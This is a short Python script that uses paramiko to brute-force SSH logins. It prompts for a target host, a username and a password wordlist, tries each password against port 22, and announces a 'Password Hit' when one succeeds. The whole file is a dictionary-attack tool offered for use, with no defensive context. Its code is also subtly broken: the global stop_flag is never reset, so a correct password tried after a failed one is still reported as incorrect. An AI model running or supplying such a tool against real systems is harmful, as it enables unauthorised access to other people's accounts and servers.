import paramiko, sys, os, socket, termcolor
import threading, time

stop_flag = 0


def ssh_connect(password):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)

    except paramiko.AuthenticationException:
        stop_flag = 1
    except socket.error as e:
        stop_flag = 2
    ssh.close()
    return stop_flag




host = input('[+] Target Address: ')

username = input('+ SSH Username: ')

input_file = input(['++ Password File ++'])
print('\n')

if os.path.exists(input_file) == False:
    print('[!!!]' + "File not found")
    sys.exit(1)

with open(input_file, 'r') as dictionary:
    for line in dictionary.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
                print(termcolor.colored(['[+] Password Hit!' + password + '[+] Account:' + username]))
                break
            elif response == 1:
                print('[-] Incorrect Login [-]' + password)
            elif response == 2:
                print(f"[:] Can't connect to server [:]")
                sys.exit(1)
        except Exception as e:
            print(e)
            pass


